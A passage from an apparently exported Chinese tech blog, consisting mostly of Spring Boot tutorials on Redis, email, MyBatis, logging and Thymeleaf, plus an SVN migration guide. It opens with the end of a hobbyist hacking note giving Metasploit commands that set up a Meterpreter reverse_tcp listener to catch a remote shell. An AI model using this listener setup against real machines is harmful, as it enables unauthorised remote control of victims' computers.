exploit/multi/handler //set payload windows/meterpreter/reverse_tcp //设置载荷set LHOST 192.168.12.130 //设置本机地址set LPORT 1234 //设置监听端口，这个和上面用msfvenom 设置的端口一致run //开始渗透获取到shell 说下废话，哥当年选计算机专业，就是感觉黑客很牛掰，黑着黑那的很神奇。但是现在发现和我想的不太一样呢。没想到计算机行业有那么多分类。黑客技术很高深，要好好学，研究才行，哥只是个业余的。]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>干货</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SVN 代码迁移]]></title>
    <url>%2Fblog%2F2017%2F08%2F12%2FSVN%20%E4%BB%A3%E7%A0%81%E8%BF%81%E7%A7%BB%2F</url>
    <content type="text"><![CDATA[SVN 将服务器上的版本库代码迁移到另一台服务器上我们可能因为服务器到期了，要把代码迁移到新的服务器，废话不多说，流程如下：1、把服务器的代码 备份。2、在新的服务器安装svn3、在新的服务器创建一个仓库4、把备份文件加载到刚创建的仓库1、备份12345# /usr/local/svnRepo 是你的仓库地址# blog 是你要备份的项目# blog.dump 是要生成的配置文件 svnadmin dump /usr/local/svnRepo/blog/ &gt; /root/blog.dump 2.在新的服务器安装svn不会安装看这里：http://www.lrshuai.top/atc/show/93、创建仓库在新的服务器 创建新的仓库1svnadmin create /usr/local/svnRepo/newblog 4、加载备份文件12345# 从旧服务器复制文件到新的服务器scp /root/blog.dump root@192.168.1.1:/root/blog.dump #192.168.1.1 就是目标主机ip(新服务器的ip)，#加载备份文件svnadmin load /usr/local/svnRepo/newblog &lt;/root/blog.dump]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (七)：操作redis数据库]]></title>
    <url>%2Fblog%2F2017%2F07%2F31%2FSpring%20Boot%20(%E4%B8%83)%EF%BC%9A%E6%93%8D%E4%BD%9Credis%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[springboot 使用redis 缓存1、引入依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; 2、添加 redis 的配置文件在application.properties123456789101112131415161718# Redis数据库索引（默认为0）spring.redis.database=0# Redis服务器地址spring.redis.host=localhost# Redis服务器连接端口spring.redis.port=6379# Redis服务器连接密码（默认为空）spring.redis.password=# 连接池最大连接数（使用负值表示没有限制）spring.redis.pool.max-active=8# 连接池最大阻塞等待时间（使用负值表示没有限制）spring.redis.pool.max-wait=-1# 连接池中的最大空闲连接spring.redis.pool.max-idle=8# 连接池中的最小空闲连接spring.redis.pool.min-idle=0# 连接超时时间（毫秒）spring.redis.timeout=0 3、添加配置类(1)、自定义一个配置类 @Value 是从配置文件引入值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778package top.lrshuai.config; import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.connection.RedisConnectionFactory;import org.springframework.data.redis.connection.jedis.JedisConnectionFactory;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.serializer.*; import redis.clients.jedis.JedisPoolConfig; /** * * @author tyro * @time 2017-07-31 * */@Configurationpublic class RedisConfig &#123; @Value(&quot;$&#123;spring.redis.database&#125;&quot;) private int database; @Value(&quot;$&#123;spring.redis.host&#125;&quot;) private String host; @Value(&quot;$&#123;spring.redis.port&#125;&quot;) private int port; @Value(&quot;$&#123;spring.redis.timeout&#125;&quot;) private int timeout; @Value(&quot;$&#123;spring.redis.pool.max-idle&#125;&quot;) private int maxidle; @Value(&quot;$&#123;spring.redis.pool.min-idle&#125;&quot;) private int minidle; @Value(&quot;$&#123;spring.redis.pool.max-active&#125;&quot;) private int maxActive; @Value(&quot;$&#123;spring.redis.pool.max-wait&#125;&quot;) private long maxWait; @Bean JedisConnectionFactory jedisConnectionFactory() &#123; JedisPoolConfig config = new JedisPoolConfig(); // 最大空闲连接数, 默认8个 config.setMaxIdle(maxidle);// 最小空闲连接数, 默认0 config.setMinIdle(minidle);// 最大连接数, 默认8个 config.setMaxTotal(maxActive);// 获取连接时的最大等待毫秒数(如果设置为阻塞时BlockWhenExhausted),如果超时就抛异常, 小于零:阻塞不确定的时间, 默认-1 config.setMaxWaitMillis(maxWait); JedisConnectionFactory factory = new JedisConnectionFactory(); factory.setDatabase(database); factory.setHostName(host); factory.setPort(port); factory.setTimeout(timeout); factory.setPoolConfig(config); return factory; &#125; @SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;) @Bean public RedisTemplate&lt;String, ?&gt; redisTemplate(RedisConnectionFactory factory) &#123; RedisTemplate&lt;String, ?&gt; template = new RedisTemplate(); template.setConnectionFactory(factory); template.setKeySerializer(new StringRedisSerializer()); template.setValueSerializer(new RedisObjectSerializer()); return template; &#125; &#125; JedisPoolConfig 的参数详情如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546JedisPoolConfig config = new JedisPoolConfig(); //连接耗尽时是否阻塞, false报异常,ture阻塞直到超时, 默认trueconfig.setBlockWhenExhausted(true); //设置的逐出策略类名, 默认DefaultEvictionPolicy(当连接超过最大空闲时间,或连接数超过最大空闲连接数)config.setEvictionPolicyClassName(&quot;org.apache.commons.pool2.impl.DefaultEvictionPolicy&quot;); //是否启用pool的jmx管理功能, 默认trueconfig.setJmxEnabled(true); //MBean ObjectName = new ObjectName(&quot;org.apache.commons.pool2:type=GenericObjectPool,name=&quot; + &quot;pool&quot; + i); 默 认为&quot;pool&quot;, JMX不熟,具体不知道是干啥的...默认就好.config.setJmxNamePrefix(&quot;pool&quot;); //是否启用后进先出, 默认trueconfig.setLifo(true); //最大空闲连接数, 默认8个config.setMaxIdle(8); //最大连接数, 默认8个config.setMaxTotal(8); //获取连接时的最大等待毫秒数(如果设置为阻塞时BlockWhenExhausted),如果超时就抛异常, 小于零:阻塞不确定的时间, 默认-1config.setMaxWaitMillis(-1); //逐出连接的最小空闲时间 默认1800000毫秒(30分钟)config.setMinEvictableIdleTimeMillis(1800000); //最小空闲连接数, 默认0config.setMinIdle(0); //每次逐出检查时 逐出的最大数目 如果为负数就是 : 1/abs(n), 默认3config.setNumTestsPerEvictionRun(3); //对象空闲多久后逐出, 当空闲时间&gt;该值 且 空闲连接&gt;最大空闲数 时直接逐出,不再根据MinEvictableIdleTimeMillis判断 (默认逐出策略) config.setSoftMinEvictableIdleTimeMillis(1800000); //在获取连接的时候检查有效性, 默认falseconfig.setTestOnBorrow(false); //在空闲时检查有效性, 默认falseconfig.setTestWhileIdle(false); //逐出扫描的时间间隔(毫秒) 如果为负数,则不运行逐出线程, 默认-1config.setTimeBetweenEvictionRunsMillis(-1); (2)、为了能让redis 存储对象，我们要实现对象的序列化接口12345678910111213141516171819202122232425262728293031323334353637383940414243package top.lrshuai.config; import org.springframework.core.convert.converter.Converter;import org.springframework.core.serializer.support.DeserializingConverter;import org.springframework.core.serializer.support.SerializingConverter;import org.springframework.data.redis.serializer.RedisSerializer;import org.springframework.data.redis.serializer.SerializationException; public class RedisObjectSerializer implements RedisSerializer&lt;Object&gt; &#123; private Converter&lt;Object, byte[]&gt; serializer = new SerializingConverter(); private Converter&lt;byte[], Object&gt; deserializer = new DeserializingConverter(); static final byte[] EMPTY_ARRAY = new byte[0]; public Object deserialize(byte[] bytes) &#123; if (isEmpty(bytes)) &#123; return null; &#125; try &#123; return deserializer.convert(bytes); &#125; catch (Exception ex) &#123; throw new SerializationException(&quot;Cannot deserialize&quot;, ex); &#125; &#125; public byte[] serialize(Object object) &#123; if (object == null) &#123; return EMPTY_ARRAY; &#125; try &#123; return serializer.convert(object); &#125; catch (Exception ex) &#123; return EMPTY_ARRAY; &#125; &#125; private boolean isEmpty(byte[] data) &#123; return (data == null || data.length == 0); &#125;&#125; 四、代码示例测试类如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101package top.lrshuai; import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map; import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.StringRedisTemplate;import org.springframework.test.context.junit4.SpringRunner; import top.lrshuai.entity.User; @RunWith(SpringRunner.class)@SpringBootTestpublic class SpringbootRedisApplicationTests &#123; @Autowired private StringRedisTemplate stringRedisTemplate; @Autowired private RedisTemplate&lt;String, User&gt; redisTemplate; @Autowired private RedisTemplate&lt;String, List&lt;User&gt;&gt; rt; @Autowired private RedisTemplate&lt;String, List&lt;Map&lt;String,Object&gt;&gt;&gt; rm; @Test public void test() throws Exception &#123; // 保存字符串 stringRedisTemplate.opsForValue().set(&quot;url&quot;, &quot;www.lrshuai.top&quot;); Assert.assertEquals(&quot;www.lrshuai.top&quot;, stringRedisTemplate.opsForValue().get(&quot;url&quot;)); // 保存对象 User user = new User(&quot;C++&quot;, 40); redisTemplate.opsForValue().set(user.getUsername(), user); user = new User(&quot;Java&quot;, 30); redisTemplate.opsForValue().set(user.getUsername(), user); user = new User(&quot;Python&quot;, 20); redisTemplate.opsForValue().set(user.getUsername(), user); Assert.assertEquals(20, redisTemplate.opsForValue().get(&quot;Python&quot;).getAge()); Assert.assertEquals(30, redisTemplate.opsForValue().get(&quot;Java&quot;).getAge()); Assert.assertEquals(40, redisTemplate.opsForValue().get(&quot;C++&quot;).getAge()); &#125; @Test public void test1() throws Exception&#123; List&lt;User&gt; us = new ArrayList&lt;&gt;(); User u1 = new User(&quot;rs1&quot;, 21); User u2 = new User(&quot;rs2&quot;, 22); User u3 = new User(&quot;rs3&quot;, 23); us.add(u1); us.add(u2); us.add(u3); rt.opsForValue().set(&quot;key_ul&quot;, us); System.out.println(&quot;放入缓存》。。。。。。。。。。。。。。。。。。。&quot;); System.out.println(&quot;=============================&quot;); List&lt;User&gt; redisList = rt.opsForValue().get(&quot;key_ul&quot;); System.out.println(&quot;redisList=&quot;+redisList); &#125; @Test public void test2() throws Exception&#123; List&lt;Map&lt;String,Object&gt;&gt; ms = new ArrayList&lt;&gt;(); Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;name&quot;, &quot;rs&quot;); map.put(&quot;age&quot;, 20); Map&lt;String,Object&gt; map1 = new HashMap&lt;&gt;(); map1.put(&quot;name&quot;, &quot;rs1&quot;); map1.put(&quot;age&quot;, 21); Map&lt;String,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(&quot;name&quot;, &quot;rs2&quot;); map2.put(&quot;age&quot;, 22); ms.add(map); ms.add(map1); ms.add(map2); rm.opsForValue().set(&quot;key_ml&quot;, ms); System.out.println(&quot;放入缓存》。。。。。。。。。。。。。。。。。。。&quot;); System.out.println(&quot;=============================&quot;); List&lt;Map&lt;String,Object&gt;&gt; mls = rm.opsForValue().get(&quot;key_ml&quot;); System.out.println(&quot;mls=&quot;+mls); &#125; &#125; Github: 代码示例 : https://github.com/rstyro/spring-boot]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (六)：发邮件]]></title>
    <url>%2Fblog%2F2017%2F07%2F30%2FSpring%20Boot%20(%E5%85%AD)%EF%BC%9A%E5%8F%91%E9%82%AE%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[#Springboot 使用 JavaMailSender 发邮件 发邮件功能，使用还是很普遍的，比如注册，找回密码，留言，推送………………….我们来看看springboot 是怎么发邮件的。1、添加依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt; 2、配置邮件信息 application.properties12345678spring.mail.host=smtp.qq.comspring.mail.username=1006059906@qq.com //用户名spring.mail.password=xxxxooooo //密码,QQ的授权码//下面是安全认证，不加会报503错误spring.mail.properties.mail.smtp.auth=true spring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=truespring.mail.default-encoding=UTF-8 这个如果在windows 一般都没什么问题，但在第三方运营商可能会有一个问题，就是 25 端口 被禁用。导致邮件发不了。解决方案：换端口，具体可看 文章地址：/atc/show/11 3、代码示例实现类如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134package top.lrshuai.service.impl; import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Value;import org.springframework.core.io.FileSystemResource;import org.springframework.mail.SimpleMailMessage;import org.springframework.mail.javamail.JavaMailSender;import org.springframework.mail.javamail.MimeMessageHelper;import org.springframework.stereotype.Component; import top.lrshuai.service.MailService; import javax.mail.MessagingException;import javax.mail.internet.MimeMessage;import java.io.File; @Componentpublic class MailServiceImpl implements MailService&#123; private final Logger logger = LoggerFactory.getLogger(this.getClass()); @Autowired private JavaMailSender mailSender; @Value(&quot;$&#123;fromMail&#125;&quot;) private String from; /** * 发送文本邮件 * @param to * @param subject * @param content */ @Override public void sendSimpleMail(String to, String subject, String content) &#123; SimpleMailMessage message = new SimpleMailMessage(); message.setFrom(from); message.setTo(to); message.setSubject(subject); message.setText(content); try &#123; mailSender.send(message); logger.info(&quot;简单邮件已经发送。&quot;); &#125; catch (Exception e) &#123; logger.error(&quot;发送简单邮件时发生异常！&quot;, e); &#125; &#125; /** * 发送html邮件 * @param to * @param subject * @param content */ @Override public void sendHtmlMail(String to, String subject, String content) &#123; MimeMessage message = mailSender.createMimeMessage(); try &#123; //true表示需要创建一个multipart message MimeMessageHelper helper = new MimeMessageHelper(message, true); helper.setFrom(from); helper.setTo(to); helper.setSubject(subject); helper.setText(content, true); mailSender.send(message); logger.info(&quot;html邮件发送成功&quot;); &#125; catch (MessagingException e) &#123; logger.error(&quot;发送html邮件时发生异常！&quot;, e); &#125; &#125; /** * 发送带附件的邮件 * @param to * @param subject * @param content * @param filePath */ public void sendAttachmentsMail(String to, String subject, String content, String filePath)&#123; MimeMessage message = mailSender.createMimeMessage(); try &#123; MimeMessageHelper helper = new MimeMessageHelper(message, true); helper.setFrom(from); helper.setTo(to); helper.setSubject(subject); helper.setText(content, true); FileSystemResource file = new FileSystemResource(new File(filePath)); String fileName = filePath.substring(filePath.lastIndexOf(File.separator)); helper.addAttachment(fileName, file); mailSender.send(message); logger.info(&quot;带附件的邮件已经发送。&quot;); &#125; catch (MessagingException e) &#123; logger.error(&quot;发送带附件的邮件时发生异常！&quot;, e); &#125; &#125; /** * 发送正文中有静态资源（图片）的邮件 * @param to * @param subject * @param content * @param rscPath * @param rscId */ public void sendInlineResourceMail(String to, String subject, String content, String rscPath, String rscId)&#123; MimeMessage message = mailSender.createMimeMessage(); try &#123; MimeMessageHelper helper = new MimeMessageHelper(message, true); helper.setFrom(from); helper.setTo(to); helper.setSubject(subject); helper.setText(content, true); System.out.println(&quot;content=&quot;+content); System.out.println(&quot;rscId=&quot;+rscId); System.out.println(&quot;rscPath=&quot;+rscPath); FileSystemResource res = new FileSystemResource(new File(rscPath)); helper.addInline(rscId, res); mailSender.send(message); logger.info(&quot;嵌入静态资源的邮件已经发送。&quot;); &#125; catch (MessagingException e) &#123; logger.error(&quot;发送嵌入静态资源的邮件时发生异常！&quot;, e); &#125; &#125;&#125; 测试类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package top.lrshuai.test;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import org.thymeleaf.TemplateEngine;import org.thymeleaf.context.Context;import top.lrshuai.service.MailService;/** * * @author tyro * */@RunWith(SpringRunner.class)@SpringBootTestpublic class MailServiceTest &#123; @Autowired private MailService mailService; @Autowired private TemplateEngine templateEngine; @Test public void testSimpleMail() throws Exception &#123; mailService.sendSimpleMail(&quot;1071426959@qq.com&quot;,&quot;test simple mail&quot;,&quot; hello this is simple mail&quot;); &#125; @Test public void testHtmlMail() throws Exception &#123; String content=&quot;&lt;html&gt;\n&quot; + &quot;&lt;body&gt;\n&quot; + &quot; &lt;h3&gt;hello world ! 这是一封html邮件!&lt;/h3&gt;\n&quot; + &quot;&lt;/body&gt;\n&quot; + &quot;&lt;/html&gt;&quot;; mailService.sendHtmlMail(&quot;1071426959@qq.com&quot;,&quot;test simple mail&quot;,content); &#125; @Test public void sendAttachmentsMail() &#123; String filePath=&quot;E:\\lrs\\github\\SSM\\README.txt&quot;; mailService.sendAttachmentsMail(&quot;1071426959@qq.com&quot;, &quot;主题：带附件的邮件&quot;, &quot;有附件，请查收！&quot;, filePath); &#125; @Test public void sendInlineResourceMail() &#123; String rscId =&quot;id001&quot;; String content=&quot;&lt;html&gt;&lt;body&gt;这是有图片的邮件：&lt;img src=\&quot;cid:&quot; + rscId + &quot;\&quot; &gt;&lt;/body&gt;&lt;/html&gt;&quot;; String imgPath = &quot;E:\\lrs\\pic\\logo.jpg&quot;; mailService.sendInlineResourceMail(&quot;1071426959@qq.com&quot;, &quot;主题：这是有图片的邮件&quot;, content, imgPath, rscId); &#125; @Test public void sendTemplateMail() &#123; //创建邮件正文 Context context = new Context(); context.setVariable(&quot;id&quot;, &quot;168&quot;); String emailContent = templateEngine.process(&quot;emailTemplate&quot;, context); mailService.sendHtmlMail(&quot;1071426959@qq.com&quot;,&quot;主题：这是模板邮件&quot;,emailContent); &#125;&#125; Github 地址： https://github.com/rstyro/spring-boot]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot （五）：与mybatis 的完美结合]]></title>
    <url>%2Fblog%2F2017%2F07%2F30%2FSpring%20Boot%20%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E4%B8%8Emybatis%20%E7%9A%84%E5%AE%8C%E7%BE%8E%E7%BB%93%E5%90%88%2F</url>
    <content type="text"><![CDATA[springboot 与mybatis 的整合一、首先有两种方式：1、第一：全注解版的2、第二：配置版的二、配置Springboot1、添加依赖1234567891011&lt;!-- 添加mybatis 依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt; 2、application.xml 要配置数据源123456spring.datasource.driverClassName = com.mysql.jdbc.Driverspring.datasource.url = jdbc:mysql://localhost:3306/demo?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=falsespring.datasource.username = rootspring.datasource.password = toor# druid pool config#spring.datasource.type = com.alibaba.druid.pool.DruidDataSource 3、在启动类 添加 @MapperScan(“你mapper文件所在的包路径”) 括号内修改为你mapper文件所在的包路径 12345678@SpringBootApplication@MapperScan(&quot;top.lrshuai.blog.dao&quot;)public class Application&#123; public static void main(String[] args) &#123; SpringApplication.run(Application.class, args); &#125;&#125; 我Github 地址：https://github.com/rstyro/spring-boot]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (四)：日志管理]]></title>
    <url>%2Fblog%2F2017%2F07%2F30%2FSpring%20Boot%20(%E5%9B%9B)%EF%BC%9A%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[默认情况下，Spring Boot会用Logback来记录日志，并用INFO级别输出到控制台。在运行应用程序和其他例子时，你应该已经看到很多INFO级别的日志了。1、添加依赖maven依赖中添加了spring-boot-starter-logging：1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;&lt;/dependency&gt; 但是呢，实际开发中我们不需要直接添加该依赖，你会发现spring-boot-starter其中包含了 spring-boot-starter-logging，该依赖内容就是 Spring Boot 默认的日志框架 logback。如果工程中有用到了Thymeleaf，而Thymeleaf依赖包含了spring-boot-starter，最终我只要引入Thymeleaf即可。2、把日志写入文件第一种方法：在application.properties 添加 logging.file=”文件路径” 或者 logging.path=”文件路径” 的属性：日志管理/1501062665966089016.png) 第二种方法：自定义logback.xml 文件Spring Boot官方推荐优先使用带有-spring的文件名作为你的日志配置（如使用logback-spring.xml，而不是logback.xml），命名为logback- spring.xml的日志配置文件，spring boot可以为它添加一些spring boot特有的配置项，如下图。3、我的logback-spring.xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt; &lt;!-- 控制台打印日志的相关配置 --&gt; &lt;appender name=&quot;STDOUT&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;!-- 日志格式 --&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%level] - %m%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!-- 日志级别过滤器 --&gt; &lt;filter class=&quot;ch.qos.logback.classic.filter.LevelFilter&quot;&gt; &lt;!-- 过滤的级别 --&gt; &lt;level&gt;INFO&lt;/level&gt; &lt;!-- 匹配时的操作：接收 （记录） --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配时的操作：拒绝DENY（不记录）接受：ACCEPT（记录） --&gt; &lt;onMismatch&gt;ACCEPT&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 文件保存日志的相关配置 --&gt; &lt;appender name=&quot;file&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;!-- 保存日志文件的路径 --&gt; &lt;file&gt;e:/logs/info.log&lt;/file&gt; &lt;!-- &lt;file&gt;/var/logs/info.log&lt;/file&gt; --&gt; &lt;!-- 日志格式 --&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%class:%line] - %m%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!-- 日志级别过滤器 --&gt; &lt;filter class=&quot;ch.qos.logback.classic.filter.LevelFilter&quot;&gt; &lt;!-- 过滤的级别 --&gt; &lt;level&gt;INFO&lt;/level&gt; &lt;!-- 匹配时的操作：接收（记录） --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配时的操作：拒绝（不记录） --&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;!-- 循环政策：基于时间创建日志文件 --&gt; &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;!-- 日志文件名格式 --&gt; &lt;fileNamePattern&gt;info.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;!-- 最大保存时间：30天--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;appender name=&quot;error&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;!-- 保存日志文件的路径 --&gt; &lt;file&gt;e:/logs/error.log&lt;/file&gt; &lt;!-- &lt;file&gt;/var/logs/error.log&lt;/file&gt; --&gt; &lt;!-- 日志格式 --&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%class:%line] - %m%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!-- 日志级别过滤器 --&gt; &lt;filter class=&quot;ch.qos.logback.classic.filter.LevelFilter&quot;&gt; &lt;!-- 过滤的级别 --&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;!-- 匹配时的操作：接收（记录） --&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;!-- 不匹配时的操作：拒绝（不记录） --&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;!-- 循环政策：基于时间创建日志文件 --&gt; &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;!-- 日志文件名格式 --&gt; &lt;fileNamePattern&gt;error.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;!-- 最大保存时间：30天--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;!-- 基于dubug处理日志：具体控制台或者文件对日志级别的处理还要看所在appender配置的filter，如果没有配置filter，则使用root配置 --&gt; &lt;root level=&quot;debug&quot;&gt; &lt;appender-ref ref=&quot;STDOUT&quot; /&gt; &lt;appender-ref ref=&quot;file&quot; /&gt; &lt;appender-ref ref=&quot;error&quot; /&gt; &lt;/root&gt;&lt;/configuration&gt; 4、java 代码调用示例1234567891011121314151617181920212223242526272829303132333435363738package top.lrshuai.helloword.controller; import org.apache.log4j.Logger;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController; import top.lrshuai.helloword.entity.User;import top.lrshuai.helloword.mapper.UserMapper; @RestControllerpublic class UserController &#123; // private Logger log = LoggerFactory.getLogger(this.getClass()); private final Logger log = Logger.getLogger(this.getClass()); @Autowired private UserMapper userMapper; @RequestMapping(&quot;/getAll&quot;) public Object getAllList()&#123; List&lt;User&gt; ulist = userMapper.getAll(); log.info(&quot;......&quot;); log.info(&quot;......&quot;); log.info(&quot;......&quot;); log.info(&quot;......&quot;); log.info(&quot;......&quot;); log.info(&quot;......&quot;); log.info(&quot;......&quot;); log.info(&quot;......&quot;); log.warn(&quot;warn....................&quot;); log.error(&quot;error....................&quot;); log.debug(&quot;debug....................&quot;); System.out.println(&quot;ulist=&quot;+ulist); return ulist; &#125;&#125; 我的Github 地址： https://github.com/rstyro/spring-boot/tree/master/springboot-log]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (三)：Thymeleaf 的使用]]></title>
    <url>%2Fblog%2F2017%2F07%2F29%2FSpring%20Boot%20(%E4%B8%89)%EF%BC%9AThymeleaf%20%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Thymeleaf 的基本语法Thymeleaf是Web和独立环境的现代服务器端Java模板引擎，能够处理HTML，XML，JavaScript，CSS甚至纯文本。Thymeleaf的主要目标是提供一种优雅和高度可维护的创建模板的方式。为了实现这一点，它建立在自然模板的概念上，将其逻辑注入到模板文件中，不会影响模板被用作设计原型。这改善了设计的沟通，弥补了设计和开发团队之间的差距。Thymeleaf也从一开始就设计了Web标准 - 特别是HTML5 - 允许您创建完全验证的模板，如果这是您需要的springboot 用thymeleaf 还是挺不错的(1)、字符串太多，显示…12# 这里的含义是 如果 atc.text 这个变量多余200个字符，后面显示...&lt;p th:text=&quot;$&#123;#strings.abbreviate(atc.text,200)&#125;&quot;&gt;内容内容内容&lt;/p&gt; (2)、数组判断是否为空1&lt;div th:if=&quot;$&#123;#lists.isEmpty(arrays)&#125; &quot; class=&quot;blog-article&quot;&gt; (3)、request 获取绝对路径1&lt;img th:src=&quot;$&#123;#httpServletRequest.getContextPath()&#125;+$&#123;atc.img&#125;&quot; src=&quot;/images/logo.jpg&quot;&gt; (4)、session 对象1234# 获取用户session 中的id&lt;input type=&quot;hidden&quot; id=&quot;user_id&quot; value=&quot;0&quot; th:if=&quot;$&#123;not #lists.isEmpty(session.SESSION_USER)&#125;&quot; th:value=&quot;$&#123;session.SESSION_USER.user_id&#125;&quot; /&gt;# session 为空时，user_id=0&lt;input type=&quot;hidden&quot; id=&quot;user_id&quot; value=&quot;0&quot; th:if=&quot;$&#123;&#123;&apos;&#123;#&apos;&#125;&#125;lists.isEmpty(session.SESSION_USER)&#125;&quot; /&gt; 常用th标签 标签 说明 例子 th:id 替换id &lt;input th:id=&quot;&#39;xxx&#39; + ${collect.id}&quot;/&gt; th:text 文本替换 &lt;p th:text=&quot;${collect.description}&quot;&gt;description&lt;/p&gt; th:utext 支持html的文本替换 &lt;p th:utext=&quot;${htmlcontent}&quot;&gt;conten&lt;/p&gt; th:object 替换对象 &lt;div th:object=&quot;${session.user}&quot;&gt; th:value 属性赋值 &lt;input th:value=&quot;${user.name}&quot; /&gt; th:with 变量赋值运算 &lt;div th:with=&quot;isEven=${prodStat.count}%2==0&quot;&gt;&lt;/div&gt; th:style 设置样式 th:style=&quot;&#39;display:&#39; + @{(${sitrue} ? &#39;none&#39; : &#39;inline-block&#39;)} + &#39;&#39;&quot; th:onclick 点击事件 th:onclick=&quot;&#39;getCollect()&#39;&quot; th:each 属性赋值 tr th:each=&quot;user,userStat:${users}&quot;&gt; th:if 判断条件 &lt;a th:if=&quot;${userId == collect.userId}&quot; 